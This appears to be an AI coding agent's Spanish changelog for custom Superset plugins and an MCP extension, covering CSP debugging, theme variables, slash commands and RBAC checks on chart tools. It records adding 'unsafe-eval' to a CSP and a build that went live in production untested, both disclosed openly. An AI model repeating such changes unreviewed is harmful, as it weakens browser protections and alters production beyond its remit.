- `split_by` sobre aliases del SQL ya funcionaba (valida contra las columnas del resultado) — sin cambios.

Verificacion:
- 43/43 tests pasan (7 nuevos sobre `execute_sql_analysis` con `_fetch_source_rows` mockeado: JOIN data+data2 con diagnósticos, extra truncada → result_exact=false/incomplete_reason, principal truncada, nombre 'data' reservado, nombre inválido, duplicado, y SQL referenciando tabla no declarada).
- `py_compile` OK; paths del ZIP verificados; ambos `.supx` con mismo md5.
- Pendiente: reinicio de `superset_mcp.service` (sudo) y repetir el export de la sesión 470f2e8d desde el chat.

### 2026-09-28 (CSP bloqueaba Calculated columns del tableV3 en test)

Cambio realizado:
Usuario reportó: en test las 3 "Calculated columns" de un gráfico table_v3 (slice 684) mostraban "N/A" en todas las filas, mientras que el mismo gráfico en producción calculaba bien. Investigación extensa (config guardada en DB, form_data_key cacheado, query real ejecutada server-side, bundle JS servido, pipeline completo de `TableChart.tsx` línea por línea, dos simulaciones fieles en Node.js) descartó dato/config/versión de código — todo apuntaba a que debía funcionar. La prueba decisiva fue un gráfico nuevo sin guardar, comparado lado a lado prod vs test (misma fuente, mismos campos, test en incógnito): prod calculaba bien, test daba N/A siempre — aislando el problema al entorno test en sí, no al slice ni al navegador.

Causa raíz: `calculatedColumns.ts::compileFormulaEvaluator` (plugin-chart-tableV3) compila cada fórmula con `new Function(...)`. Eso requiere el permiso `'unsafe-eval'` en el CSP `script-src` del navegador. `superset_config_test.py` tiene `TALISMAN_ENABLED` con default `True` (vs `False` en prod) y, al no correr en modo debug, usa `TALISMAN_CONFIG` (el estricto, `script-src: ['self', 'strict-dynamic']`, sin `unsafe-eval`) en vez de `TALISMAN_DEV_CONFIG` (que sí lo tiene). El navegador bloquea la compilación, el `catch` de `compileFormulaEvaluator` la atrapa en silencio y cachea un evaluador que siempre devuelve `null` — sin ningún error visible en logs de Superset, solo como violación de CSP en la consola del navegador. Afecta CUALQUIER fórmula (simple o con `total.`), consistente con lo observado. Prod nunca lo sufrió porque corre con `TALISMAN_ENABLED=False` (sin CSP en absoluto).

Nota para el futuro: esto es un problema latente también en producción si algún día se activa CSP ahí (hoy prod no tiene ninguna protección CSP, lo cual es en sí mismo un tema de seguridad aparte, no abordado en esta sesión). La solución de fondo sería reescribir `compileFormulaEvaluator` sin `new Function()` (parser propio, CSP-safe) — no se implementó, ver "Camino B" abajo.

Archivos afectados:
- `superset_config_test.py` (línea ~2307, `TALISMAN_CONFIG.content_security_policy.script-src`)

Que cambia o corrige:
- `script-src` de test pasa de `["'self'", "'strict-dynamic'"]` a `["'self'", "'strict-dynamic'", "'unsafe-eval'"]`, emparejando el comportamiento efectivo de test con el de prod (que hoy no tiene CSP) para esta feature. Cambio de config únicamente — camino A de dos opciones planteadas al usuario (A: ajuste de config, ya aplicado; B: reescribir el evaluador de fórmulas sin `new Function`, pendiente, no urgente mientras prod no tenga CSP).

Verificacion:
- Header `Content-Security-Policy` de `http://127.0.0.1:9090/explore/` confirmado con `unsafe-eval` presente tras el restart.
- `superset_test.service` reiniciado y `active (running)`.
- Pendiente confirmación del usuario: recargar el gráfico de slice 684 en test y verificar que "Peso Sell In sobre total" / "Es un test" ya no muestren N/A.

### 2026-09-28 (handlebarsTemplate de html_cards no documentaba group/division)

Cambio realizado:
Reportado por el backend del chat (sesión `explore-fa693d0e6f4b80256a95f444271b5337ff49d933146228ff2745ebe80a5a146a`): el asistente rechazó proponer una tarjeta por familia con una tabla de marcas anidada al pasar el cursor porque `control_info.handlebarsTemplate.description` de `irex.get_viz_controls` no documentaba cómo agrupar filas dentro de la plantilla, pese a que el plugin ya registra el helper real (`HandlebarsGroupBy.register(Handlebars)` en `HandlebarsViewer.tsx`, sintaxis `{{#group displayRows by="<templateKey>"}}...{{/group}}`, expone `value`/`items`). También faltaba `division` (de `just-handlebars-helpers`, vía `Helpers.registerHelpers(Handlebars)`).

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_viz_controls_core.py` (`_HTML_CARDS_CONTROL_INFO["handlebarsTemplate"]`)
- `custom-plugins/plugin-chart-html-cards/src/plugin/controls/handlebarTemplate.tsx` (tooltip de ayuda del control — mismo listado que el MCP)
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_viz_controls_core.py` (+3 tests: menciona group/division con su sintaxis real; compara la metadata contra los helpers REALMENTE registrados en `HandlebarsViewer.tsx`, leyendo el archivo fuente en vez de una lista copiada a mano; compara el tooltip de la UI contra `control_info` para que ninguno mencione algo que el otro omite)
- `custom-plugins/plugin-chart-html-cards/src/__tests__/handlebarsGroupHelpers.test.ts` (nuevo — render con datos sintéticos contra los helpers reales, ver nota de infraestructura abajo)
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md`
- `extensions_test/irex-mcp-tools-0.1.0.supx`

Que cambia o corrige (aditivo, no reduce nada de lo ya documentado):
- `control_info.handlebarsTemplate` de `html_cards` ahora incluye `group` (sintaxis, y aclara que `by=` necesita el `templateKey` de `columns[]`, no el nombre SQL ni el `displayName`) y `division` (con la advertencia de que NO protege contra denominador 0/null por sí sola — hay que envolver en `{{#if b}}...{{else}}...{{/if}}`).
- Hallazgo propio, no reportado por el backend del chat, encontrado al escribir la prueba de render: combinar `group` con `{{#with (sum (pluck items "X")) as |d|}}` para no repetir la expresión del denominador rompe en silencio — `{{value}}`/`items` dentro del `#with` dejan de apuntar al `{{#group}}` exterior salvo que se use `../value`/`../items`. Documentado en la descripción como "más simple repetir la expresión que anidar #with".
- Se mantuvo `source: "specific"` y la lista exacta de nombres de controles sin cambios, como pidió el reporte — este cambio es solo de `control_info` (metadata), no del catálogo de controles.

Verificacion:
- 44/44 tests de `test_explore_viz_controls_core.py` (358/358 del backend completo) — incluye los 3 tests nuevos de coverage cruzada.
- Prueba de render (`handlebarsGroupHelpers.test.ts`) validada por fuera de Jest con un script Node standalone contra los mismos paquetes reales (`handlebars`, `just-handlebars-helpers`, `handlebars-group-by`) — confirma los 5 casos, incluido el bug de scope de `{{#with}}`.
- **Hallazgo de infraestructura, no resuelto**: Jest (config actual de `superset-frontend/jest.config.js`) NO descubre tests dentro de `custom-plugins/*` porque son symlinks — el crawler no los sigue, y aun forzando el descubrimiento con `--roots`, la resolución de módulos hoisted (`handlebars` vive en `superset-frontend/node_modules`, no en el del plugin) tampoco alcanza esa ruta. Afecta a los TRES plugins propios por igual — ninguno tenía tests antes de este cambio, así que nunca se había topado con esto. El archivo de test queda en el lugar canónico correcto según `PLUGINS.md` para cuando se arregle, pero no corre todavía vía `npm run test`. Arreglar `jest.config.js` es un cambio a un archivo compartido de Superset (afecta ~3600 archivos rastreados) — no se tocó sin autorización explícita.
- `build-extension.sh` corrido completo: TypeScript estricto, 298 tests frontend del asistente (irex-mcp-tools, no del plugin html_cards), 358 tests backend, build webpack, `.supx` reconstruido y copiado a `extensions_test/`.
- `superset_mcp_test.service` reiniciado; confirmado con un import directo que `resolve_viz_controls("html_cards")` devuelve la descripción nueva (1977 caracteres, bajo el límite de 2000 que recorta el backend del chat).
- Pendiente: que el backend del chat repita la conversación de la sesión `explore-fa693d0e...` en test para confirmar que ahora sí propone la tarjeta con tabla de marcas anidada.

### 2026-09-28 (colores hardcodeados/de navegador en vez del tema real de Superset, los 3 plugins)

Cambio realizado:
Usuario reportó (sesión `explore-d362e3c9...`): el asistente maneja bien solicitudes complejas de html_cards, pero para "modo oscuro" terminó usando colores de sistema del navegador/SO (`Canvas`, `CanvasText`, `GrayText`, `color-scheme: light dark`) en vez del tema real de Superset — el propio modelo lo admitió: "no puedo confirmar que coincida con un tema oscuro de Superset configurado de forma independiente". Pidió revisar las 3 (html_cards, table_v3, pivot_table_rx1).

Investigación: en **html_cards** el mecanismo de tema real YA existe (`HtmlCards.tsx` inyecta `useTheme()` como variables CSS `--html-cards-theme-color-*` en el contenedor), pero (1) solo estaba documentado bajo el helper `themeVars` de `handlebarsTemplate`, no en `styleTemplate` (el control donde de verdad se escribe CSS) — el modelo nunca conectó los dos; (2) la plantilla CSS **por defecto** del control (`style.tsx`) hardcodea `--mini-primary: #0f8db3` etc., mal ejemplo que probablemente sesgó al modelo. En **table_v3** y **pivot_table_rx1**, confirmado leyendo el código real: el tema se usa SOLO internamente (cromado propio de la tabla) — nunca se expone a `column_config.htmlTemplate`/`htmlCss`. No es un hueco de documentación, la capacidad no existía.

Usuario confirmó ambas correcciones vía pregunta: (1) sí corregir el default de html_cards con fallback, (2) sí agregar el mismo mecanismo a table_v3 y pivot_table_rx1.

Archivos afectados:
- `custom-plugins/plugin-chart-html-cards/src/plugin/controls/style.tsx` (plantilla CSS por defecto)
- `custom-plugins/plugin-chart-tableV3/src/TableChart.tsx` (nuevo `themeCssVars`, aplicado al wrapper `<Styles>`)
- `custom-plugins/plugin-chart-pivot-tableRx1/src/PivotTableChart.tsx` (ídem)
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_viz_controls_core.py` (`styleTemplate` de html_cards + `_column_config_html_template_rules()`, antes `COLUMN_CONFIG_HTML_TEMPLATE_RULES` constante, ahora función parametrizada por prefijo de variables CSS — compartida por table_v3/pivot)
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_viz_controls_core.py` (+4 tests)

Que cambia o corrige:
- `--mini-primary/-surface/-text-main/-text-muted/-border/-danger-text` del default de html_cards ahora son `var(--html-cards-theme-color-X, <mismo color de hoy>)` — mismo nombre de variable (compatibilidad con CSS que ya las referencia), mismo aspecto visual por defecto (fallback), pero ahora siguen el tema real configurado en Superset. Igual para `.kpi-mini__status--warning/--danger`.
- `TableChart.tsx`/`PivotTableChart.tsx` ganan `themeCssVars` (mismo patrón y mismos 14 tokens que html_cards: colorPrimary/-PrimaryBg/-BgContainer/-BgElevated/-Border/-Text/-TextSecondary/-Success/-Warning/-Error/-BorderRadius/-FontFamily/-FontSize/-FontSizeSM), con prefijo propio por plugin (`--table-v3-theme-*`, `--pivot-table-rx1-theme-*`) aplicado como `style` inline en el wrapper `<Styles>` de cada uno — ahora `column_config.htmlTemplate`/`htmlCss` de estos dos plugins SÍ puede referenciar el tema real por primera vez.
- `control_info.styleTemplate` (html_cards) y `control_info.column_config` (table_v3/pivot) documentan explícitamente estas variables y advierten contra colores de sistema del navegador/SO (`Canvas`/`CanvasText`/`light-dark()`) — el error exacto que cometió el modelo.
- `COLUMN_CONFIG_HTML_TEMPLATE_RULES` (constante compartida) pasó a ser `_column_config_html_template_rules(css_var_prefix)` (función) para poder inyectar el prefijo correcto por plugin sin duplicar el texto — se aprovechó para comprimir la redacción existente (sin perder ningún hecho) porque el límite de 2000 caracteres que recorta el backend del chat estaba casi agotado (pivot_table_rx1 ya iba en 1973/2000 antes de este cambio).

Verificacion:
- 362/362 tests backend (4 nuevos: variables de tema en styleTemplate; prefijo correcto en table_v3/pivot sin mezclarse entre sí; longitud ≤2000 de las 3 descripciones que más crecieron).
- `npm run type` (tsc --noEmit) limpio en los 3 archivos tocados — los 572 errores preexistentes del typecheck completo son de OTROS plugins/paquetes sin relación, confirmado que ninguno menciona `plugin-chart-tableV3`, `plugin-chart-pivot-tableRx1` ni `plugin-chart-html-cards`.
- `npm run build` (webpack producción, superset-frontend completo): compiló los 12824 módulos (incluidos los 3 archivos tocados) sin error de sintaxis/tipos, PERO el build completo **falla** en la minificación de CSS (`css-minimizer-webpack-plugin` → `serialize-javascript`: `ReferenceError: crypto is not defined`, dentro de un worker thread) — reproducido 2 veces, mismo error, en un chunk genérico "Chart.*.chunk.css" sin relación aparente con los archivos tocados (probaron `NODE_OPTIONS=--experimental-global-webcrypto`, sin efecto). **Es un problema de entorno preexistente (Node 18.19.1 + esa versión de css-minimizer-webpack-plugin en worker threads), no causado por este cambio** — pero SÍ bloquea completar `npm run build`, así que **los `static/assets/` servidos por `superset_test.service`/`superset.service` todavía NO tienen estos cambios** (confirmado: ningún archivo de `static/assets` es más nuevo que la edición de `TableChart.tsx`). Los cambios de código están commiteados y verificados por tipo, pero no desplegados todavía.
- Pendiente: resolver el bug de build (fuera del alcance de este pedido, es de infraestructura) o encontrar un workaround (ej. desactivar minificación de CSS específicamente) antes de poder desplegar a test y que el usuario lo vea en el navegador.

**Fix del bug de build, a pedido explícito del usuario ("Arreglalo"):** causa raíz encontrada — `css-minimizer-webpack-plugin`'s `serialize-javascript` (dependencia anidada) usa el identificador GLOBAL `crypto` (Web Crypto API) sin `require()`, algo que en Node 18.19.1 SOLO está disponible como global implícito detrás del flag `--experimental-global-webcrypto` (confirmado con un script mínimo: `typeof crypto` da `"undefined"` en un archivo de módulo real sin el flag, `"object"` con el flag; `crypto.getRandomValues(...)` funciona correctamente con el flag). El intento anterior de pasar `NODE_OPTIONS="--experimental-global-webcrypto"` por variable de entorno no funcionaba porque el script `build` de `package.json` usa `cross-env NODE_OPTIONS=--max_old_space_size=8192`, que REEMPLAZA cualquier `NODE_OPTIONS` externo en vez de combinarse con él.

Archivo afectado: `superset_v6_1_0/superset-frontend/package.json` (scripts `build` y `build-instrumented`, los dos que corren `--mode production` y por lo tanto pasan por `CssMinimizerPlugin`) — `NODE_OPTIONS` ahora incluye también `--experimental-global-webcrypto`. `build-dev` no se tocó (modo desarrollo, sin minificación).

Verificacion:
- `npm run build` completo: exit 0, 2 warnings (sin relación, no aparecen como error — probablemente los límites de tamaño de asset estándar de webpack, ya presentes en un proyecto de este tamaño).
- Confirmado que `static/assets/` se regeneró (archivos con mtime posterior a la edición de `TableChart.tsx`) y que contiene las 3 variables de tema nuevas (`grep` de `table-v3-theme-color-primary`/`pivot-table-rx1-theme-color-primary`/`html-cards-theme-color-primary` en los `.js` compilados, todas presentes).
- `curl` a `/health` de prod (8088) y test (9090): ambos 200 tras el swap de assets, sin reinicio de servicio (Flask sirve estáticos directo de disco).

**Hallazgo importante de infraestructura, no documentado antes en esta sesión:** a diferencia de la extensión `.supx` (que tiene `extensions_test/` aislado de `extensions/` de producción), los plugins de chart (`custom-plugins/*`) NO tienen esa separación — `superset_v6_1_0/superset/static/assets/` es el MISMO directorio que sirven `superset.service` (prod, 8088) y `superset_test.service` (test, 9090), porque ambos derivan la ruta del mismo paquete instalado (`files("superset") / "static/assets"`, sin override en ninguno de los dos `superset_config*.py`). Esto significa que **`npm run build` en `superset-frontend` despliega a prod y test simultáneamente, sin reinicio de servicio y sin forma de probar en test primero** — muy distinto del flujo de `irex-mcp-tools`. Los cambios de tema de esta entrada (y el fix del build en sí) ya están live en producción desde que terminó el build, no solo en test. Vale la pena tenerlo presente para cualquier cambio futuro de `custom-plugins/`.

### 2026-09-28 (ajustes al MCP: ejemplo de tema + responsivo real en html_cards)

Cambio realizado (dos pedidos puntuales del backend del chat/usuario, sobre lo ya deployado hoy):
1. Recomendación del backend del chat: `control_info.styleTemplate` de html_cards tenía espacio bajo el límite de 2000 caracteres — sumarle un ejemplo concreto de uso de las variables de tema (la de `handlebarsTemplate` está casi al límite, así que documentar ahí en vez de en handlebarsTemplate) y una prueba que coteje la lista publicada contra `themeCssVars` real de `HtmlCards.tsx`.
2. Usuario: "lo creado en HTML_cards debe ser responsivo, gráficos tarjetas etc." — verificado: el plugin YA tiene el mecanismo correcto (`container-type: size`/`container-name: html-cards-chart` + `--html-cards-chart-width/-height` en `HtmlCards.tsx`, exactamente como el de las variables de tema) pero no estaba documentado en `styleTemplate` — mismo patrón de hueco que el de colores: capacidad real, sin documentar donde se escribe CSS.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/explore_viz_controls_core.py` (`styleTemplate` de html_cards)
- `custom-extensions/irex-mcp-tools/backend/tests/test_explore_viz_controls_core.py` (+3 tests)
- `extensions_test/irex-mcp-tools-0.1.0.supx`

Que cambia o corrige:
- Ejemplo agregado: `background: var(--html-cards-theme-color-bg-container); color: var(--html-cards-theme-color-text); border: 1px solid var(--html-cards-theme-color-border); border-radius: var(--html-cards-theme-border-radius)`.
- Sección nueva "Responsivo": explica `@container html-cards-chart (max-width: Npx) {...}` / `(max-height: Npx) {...}` contra el tamaño REAL del gráfico — explícito que NO usar `@media` (mide el viewport del navegador, no el tile del dashboard, que puede ser chico en un dashboard grande aunque la ventana sea ancha). Incluye los umbrales reales de `handlebarsTemplate.layout` (`isNarrow` width<900, `isTiny` width<560, `isCompact` width<900 o height<420) para que si se usan los dos (CSS + Handlebars) queden consistentes.
- `styleTemplate` queda en 1954/2000 caracteres.

Verificacion:
- 365/365 backend (3 tests nuevos: menciona el mecanismo responsivo real; container-name y umbrales cotejados contra `HtmlCards.tsx`/`templateContext.ts` reales, no una lista a mano — si cambian ahí sin actualizar la descripción, la prueba lo detecta).
- `build-extension.sh` completo, `.supx` reconstruido y copiado a `extensions_test/`.
- Pendiente: el usuario reinicie `superset_mcp_test.service` (el `sudo` de este agente no está pidiendo contraseña de forma consistente en esta sesión — a veces se aplica igual por otro medio, a veces no; mejor que lo confirme el usuario manualmente esta vez).

### 2026-09-28 (comandos /resume y /clear — retomar conversación de un gráfico guardado)

Cambio realizado:
Usuario reportó dos huecos de UX del copiloto de Explore: (1) al guardar un gráfico y navegar al dashboard, volver a editarlo arranca en una conversación nueva sin forma de retomar la anterior; (2) no hay forma de reusar el diseño de un gráfico (ej. html_cards) en otro. Investigado contra el código real antes de diseñar nada:

- **Punto 2 no era un hueco del MCP.** `get_chart_info` (tool del HOST, ya disponible para el modelo) devuelve el `form_data` COMPLETO de cualquier gráfico guardado (`params` parseado) dado su ID — el modelo ya puede leer `handlebarsTemplate`/`styleTemplate`/`column_config`/`calculated_columns` de cualquier chart vía `list_charts` + `get_chart_info`, y aplicarlos con `patch_form_data` (ya existente). Era un hueco de orquestación/prompt, no de capacidad. Fix mínimo: agregado un párrafo a la descripción de `irex.get_viz_controls` explicando este flujo (`list_charts` + `get_chart_info` + esta tool para validar los controles del viz_type destino + `patch_form_data`).
- **Punto 1 sí era un hueco real**, resuelto con comandos `/resume` y `/clear` en el composer. Antes de construir nada, se confirmó con el backend del chat (relay del usuario) el mecanismo real: `session_id` se DERIVA de `(usuario, conversation_key)` — no es algo que se pueda enviar; reenviar el mismo `conversation_key` (UUID) hace que el backend rehidrate el historial persistido en Postgres si salió de la caché en memoria (TTL de 30 min ahí; SIN TTL en el almacén persistente). También confirmaron un matiz importante: cada turno vuelve a verificar `form_data_key`/dataset igual que uno nuevo (nunca se confía en evidencia vieja), y un cambio de gráfico/dataset/tipo abre una "frontera de contexto" del lado del backend.
- Verificado además que el log de diagnóstico (`/api/logs/sessions/<id>`) NO guarda el texto del usuario (solo tool calls y la respuesta final) — no serviría para reconstruir una conversación mostrable. Por eso la extensión guarda su PROPIO historial completo (texto de usuario y asistente, tal cual se ve en pantalla) en el navegador, no depende del backend para el contenido — solo reenvía el `conversation_key` para que el backend tenga el contexto real del lado del modelo.

Archivos afectados:
- `custom-extensions/irex-mcp-tools/frontend/src/hosts/exploreConversationHistory.ts` (nuevo) — persistencia en `localStorage`, indexada por `slice_id`, hasta 10 conversaciones por gráfico, sin vencimiento por tiempo (pedido explícito del usuario)
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/slashCommands.ts` (nuevo) — parser de comandos `/` + registro extensible (`resume`, `clear`)
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreConversation.tsx` — menú de autocompletado sobre el textarea (Slack/Discord-style: aparece al tipear `/`, flechas+Tab/Enter para elegir, Escape para cerrar), ruteo de submit (comando vs mensaje normal), botón "Ejecutar" en vez de "Generar" para un comando pendiente
- `custom-extensions/irex-mcp-tools/frontend/src/assistant/ExploreAssistantPanel.tsx` — `handleCommand` (`/clear` = `handleNewSession`; `/resume` [n] = retoma directo con 1 candidata o índice explícito, picker con 2+, aviso si no hay ninguna o el gráfico no está guardado), `ExploreResumePicker` (tarjeta de elección), grabado automático de cada intercambio exitoso vía `recordConversationEntry`
- `custom-extensions/irex-mcp-tools/backend/src/irex/irex_mcp_tools/get_viz_controls.py` (hint de reuso de diseño entre gráficos)
- `custom-extensions/irex-mcp-tools/docs/explore-assistant-contract.md` (sección nueva "Comandos del composer")
- 3 archivos de test nuevos/ampliados (ver Verificación)

Que cambia o corrige:
- Al abrir un gráfico guardado, el panel SIEMPRE arranca en sesión nueva — nunca retoma solo (pedido explícito del usuario).
- `/resume` (con autocompletado): 0 candidatas → aviso; gráfico sin guardar → aviso específico; 1 candidata → retoma directo; 2+ → picker (fecha relativa, cantidad de mensajes, primer mensaje, más reciente primero); `/resume <n>` elige por índice directo (1 = más reciente), con aviso si el índice no existe.
- `/clear` — mismo efecto que el botón "Nueva sesión" ya existente, como comando.
- El registro de comandos (`SLASH_COMMANDS` en `slashCommands.ts`) es una lista chica y explícita — agregar un comando nuevo a futuro es sumar una entrada ahí, sin tocar el parser.

Verificacion:
- 35 tests nuevos (25 en `slashCommands.test.ts` + `exploreConversationHistory.test.ts`, puros; 10 de integración en `ExploreAssistantPanel.test.tsx`: grabado tras un intercambio exitoso, menú de autocompletado, cambio de label del botón, `/clear`, `/resume` en sus 6 variantes — sin guardar/sin candidatas/una/varias con picker/por índice/índice fuera de rango).
- 333/333 tests frontend total, `tsc --noEmit` limpio.
- `build-extension.sh` completo (TS estricto, tests backend, webpack, `.supx` reconstruido), copiado a `extensions_test/`.
- Pendiente: el usuario reinicie `superset_mcp_test.service` (mismo problema de `sudo` no interactivo de la entrada anterior) y pruebe el flujo real: guardar un gráfico, navegar al dashboard, volver, y usar `/resume`.

### 2026-09-28 (verificación de list_charts/get_chart_info para "reutilizar diseño" — hallazgos reales, 2 corregidos en test)

Cambio realizado:
Backend del chat pidió verificar con pruebas reales (no solo lectura de código) `list_charts`/`get_chart_info` para el flujo "reutilizar el diseño de un gráfico guardado en Explore" — visibilidad en `tools/list`, identidad autenticada, filtrado RBAC, forma exacta de entrada/salida (sin confundir `slice_id` dentro de `form_data` con el ID real), paginación/búsqueda, y comportamiento con CSS/plantillas largos (backend admite hasta 60 000 caracteres, por encima informa `truncated:true` y no debe proponerse copia parcial).

Método: script ad-hoc en el scratchpad (mismo patrón que `scripts/e2e_rbac.py` — JWT firmado con `MCP_JWT_SECRET`/`ISSUER`/`AUDIENCE` de `superset_config_test.py`, `fastmcp.Client` contra `http://127.0.0.1:5009/mcp` real), NO mocks. Encontrados 3 hallazgos reales:

1. **`list_charts`/`get_chart_info` NO aparecían en `tools/list` en absoluto** (confirmado con `client.list_tools()`: 25 tools, todos `extensions.irex.irex-mcp-tools.irex.*`). Causa: `MCP_FACTORY_CONFIG` de `superset_config_test.py` tiene `include_tags=["irex"]` — oculta TODOS los tools nativos de Superset (decisión deliberada, "para eliminar la confusión del modelo entre tools nativas e IREX", documentada en el propio config) y estos dos tools nativos no tienen ese tag. Importante: SÍ se pueden llamar por nombre exacto pese a no estar listados (confirmado — `call_tool("list_charts", ...)` funciona aunque el tool no aparezca en `tools/list`) — la ocultación es solo de DESCUBRIMIENTO, no de ejecución; los permisos reales se siguen validando en la capa de datos (RBAC), no en la de listado.
2. **Confirmado con JWT de un usuario Gamma ("test", sin gráficos propios) contra un gráfico de admin (id 684)**: `list_charts` devuelve `total_count: 0` (no ve ningún gráfico ajeno) y `get_chart_info(684)` devuelve `{"error": "ChartInfo with identifier '684' not found", "error_type": "not_found"}` — RBAC real (mismo `ChartFilter`/`base_filter` que usa el resto de Superset) aplicado tanto en list como en get, usando la identidad del JWT (`sub`), no un usuario fijo.
3. **Confirmado el riesgo exacto que preguntó el backend**: `get_chart_info`'s `form_data` (el JSON completo de `params`) SÍ incluye un campo `form_data.slice_id` interno que en la práctica coincide con el `id` de nivel superior — pero es un campo DISTINTO, propenso a quedar desactualizado (charts duplicados/importados). El campo AUTORITATIVO es el `id` de nivel superior (el que devuelve `ChartDAO`/`ModelGetInfoCore` directo de la fila real), nunca `form_data.slice_id`. Documentado explícitamente en el hint agregado a `irex.get_viz_controls` (entrada anterior) — se refuerza acá con el ejemplo real verificado.
4. **Paginación y búsqueda confirmadas**: página 1 = ids 1-10, página 2 = ids 11-20 (sin superposición); `search="test asistente"` encuentra el chart 684 sin necesidad de recorrer todas las páginas.
5. **Bug real encontrado al probar con un form_data grande**: se creó un chart temporal (borrado al terminar) duplicando uno real con `styleTemplate` inflado a ~65 000 caracteres (por encima del umbral de 60k que maneja el backend del chat). `get_chart_info` sobre ese chart **crashea** con `'dict' object has no attribute 'to_mcp_result'` en vez de devolver algo. Causa raíz: `ResponseSizeGuardMiddleware` (`superset/mcp_service/middleware.py`), al superar ~25 000 tokens estimados, intenta truncar dinámicamente (`get_chart_info` está en `INFO_TOOLS`, con `_MAX_STRING_CHARS=500` por campo — habría cortado `styleTemplate`/`handlebarsTemplate` a la mitad de una regla CSS, corrompiendo el diseño en vez de acortarlo con sentido) pero la función de truncado (`truncate_oversized_response`) devuelve un `dict` plano en vez del tipo de resultado que FastMCP espera recibir de vuelta del middleware — la llamada entera revienta.

Archivos afectados:
- `superset_v6_1_0/superset/mcp_service/chart/tool/list_charts.py` (tag `"irex"` agregado)
- `superset_v6_1_0/superset/mcp_service/chart/tool/get_chart_info.py` (tag `"irex"` agregado)
- `superset_config_test.py` (`list_charts`/`get_chart_info` sumados a `MCP_TOOL_SEARCH_CONFIG.always_visible`; `get_chart_info` sumado a `MCP_RESPONSE_SIZE_CONFIG.excluded_tools`, nuevo override)
- `PLUGINS.md` (nota + fila en la tabla de archivos del backend modificados — este parche NO está cubierto por `migrate-plugins.sh`, hay que reaplicarlo a mano en la próxima migración de versión)

Que cambia o corrige (siguiendo la instrucción de arreglar los tools existentes, no crear uno nuevo):
- Los dos tools nativos ganan el tag `"irex"` (sin quitarles el suyo propio) para pasar el filtro `include_tags` y quedar en `always_visible` — visibles en `tools/list` sin que el modelo necesite adivinar el nombre.
- `get_chart_info` excluido del guard de tamaño (`MCP_RESPONSE_SIZE_CONFIG.excluded_tools`) en vez de dejarlo truncar en silencio o crashear: para este tool específico, un `form_data` completo o un error limpio son las dos únicas respuestas aceptables — nunca una copia parcial. El bug de fondo del `dict` plano en `_try_truncate_info_response` (que también podría afectar a `get_dataset_info`/`get_dashboard_info`/`get_instance_info`, los otros 3 `INFO_TOOLS`) **no se corrigió** — excluir el tool es la corrección mínima para este flujo puntual; queda anotado como hallazgo aparte, no resuelto, para quien retome el trabajo.

Verificacion:
- Los 5 hallazgos de arriba, cada uno confirmado con una llamada MCP real (JWT propio, sin mocks) contra el servidor de test — no solo lectura de código.
- `superset_mcp_test.service` reiniciado (el mensaje de `sudo` sigue imprimiendo "a password is required", pero el `ActiveEnterTimestamp` confirmó que el reinicio SÍ se aplicó esta vez). Reverificado DESPUÉS del reinicio, contra el servidor real:
  - `tools/list`: 27 tools (antes 25) — `list_charts` y `get_chart_info` presentes.
  - RBAC: repetido igual que antes del reinicio, mismo resultado (`total_count:0` / `not_found` limpio para el usuario Gamma).
  - Chart de ~65 443 caracteres (recreado, mismo padding que antes): `get_chart_info` devuelve el `form_data` COMPLETO, sin crash — `len(json.dumps(form_data)) == 65443` exacto, `styleTemplate` termina byte a byte igual a lo guardado.
- Los 2 charts temporales de prueba (ids 685, recreado una vez) eliminados al terminar — no queda basura en la base de test.
- **Hallazgo de infraestructura importante**: `list_charts.py`/`get_chart_info.py` son archivos de `superset_v6_1_0/superset/mcp_service/`, compartidos entre `superset.service` (prod) y `superset_test.service` (test) — igual que con los plugins de chart, el cambio de código YA está en el archivo que prod también usa, pero un cambio de código Python (a diferencia de los assets estáticos del frontend) requiere reinicio del PROCESO para tomar efecto — `superset_mcp.service` (prod) seguirá con el comportamiento de ANTES hasta que alguien lo reinicie por cualquier motivo, momento en el que estos dos tools pasarían a ser visibles ahí también (prod tiene el mismo `include_tags=["irex"]`, confirmado). No se tocó la config de prod ni se reinició ese servicio — pero vale la pena que quede claro antes de cualquier reinicio de `superset_mcp.service` no relacionado con este cambio.

### 2026-09-28 (rgba() mal formado: bug real y recurrente del modelo, documentado — y formateador de CSS/HTML en el diff)

Cambio realizado:
Sesión `explore-22cae395...`: el usuario preguntó si html_cards admite efectos (sí, CSS libre, `HTML_SANITIZATION=False` confirmado en ambos entornos) y el modelo propuso un brillo con `@keyframes`. Al revisar el `styleTemplate` REALMENTE persistido del slice 54 (no solo el mensaje del modelo) encontré 3 valores de color inválidos: `rgba(99 245 200,.18)`, `rgba(00.0,.16)`, `rgba(255 255 255,.42)` — canales separados por espacio pero con coma antes del alfa, mezcla inválida de las dos sintaxis de color CSS. El navegador descarta la declaración entera sin ningún error visible — por eso "no se ven los efectos". **No es un error aislado**: el mismo patrón (`rgba(1 523.42,.06)`) ya había aparecido en otra sesión (`explore-d362e3c9...`) con OTRO color — mismo modelo (`gpt-6-luna`), confirmando un hábito sistemático, no una casualidad.

El usuario pidió corregirlo y le dijo al modelo que arreglara los 3 valores; el modelo respondió "Propongo corregir las tres declaraciones rgba()" pero el "Ver cambio" mostró "Este cambio no modifica nada". Comparé byte a byte el `styleTemplate` "corregido" contra el que ya estaba activo en ese estado: son IDÉNTICOS — el modelo no cambió nada real, solo lo dijo. Confirmado que el mecanismo de diff (`diffFormData`, comparación exacta) funcionó CORRECTAMENTE — el problema es 100% del lado de la generación del modelo, no de la extensión.

El usuario pidió además que, si hay algo que el backend pueda hacer, se lo pidiera — se envió recomendación de reforzar el prompt y/o agregar una reparación determinística (regex) del lado de ellos, dado que ni siquiera señalarle el error explícitamente le alcanzó al modelo para corregirlo sobre un bloque de CSS grande.

